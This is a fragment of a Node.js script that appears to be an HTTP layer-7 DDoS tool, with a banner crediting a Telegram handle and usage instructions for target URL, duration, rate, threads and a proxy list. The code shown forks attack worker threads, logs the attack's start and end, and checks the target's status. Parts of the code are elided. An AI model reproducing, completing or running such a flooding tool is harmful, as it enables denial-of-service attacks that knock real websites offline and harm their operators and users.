 ...
 if (process.argv.length < 7){console.log(`
           ...
           METHOD DDOS LATER 7 HOLD DEVELOPMENT BY t.me/ozz                 
           
Usage: node HTTP-X.js Target Time Rate Thread ProxyFile
Example: node HTTP.js https://target.com 120 32 8 proxy.txt
`); process.exit();}
 const headers = {};
 ...
 const getCurrentTime = () => {
  ...
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      ...
      console.log(`${getCurrentTime()} [HTTP]  Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
    })
    .catch((error) => {
      if (error.message === 'Request Timed Out') {
        console.log(`${getCurrentTime()} [HTTP]  Request Timed Out`);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
        console.log(`${getCurrentTime()} [HTTP]  Title: ${extractedTitle} `);
      } else {
        console.log(`${getCurrentTime()} [HTTP]  ${error.message}`);
      }
    });
}
...
if (cluster.isMaster){
  ...
  console.log(`
           ...
           METHOD DDOS LATER 7 DEVELOPMENT BY t.me/ozzzzzzz              
                        Press Ctrl+Z To Stop DDoS
`);
  
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
    console.log(`${getCurrentTime()} [ozz]  Attack Thread ${i} Started`);
  }
  console.log(`${getCurrentTime()} [ozz]  The Attack Has Started`);
  setInterval(getStatus, 2000);
  setTimeout(() => {
    console.log(`${getCurrentTime()} [ozz]  The Attack Is Over`);
    process.exit(1);
  }, process.argv[3] * 1000);
} 
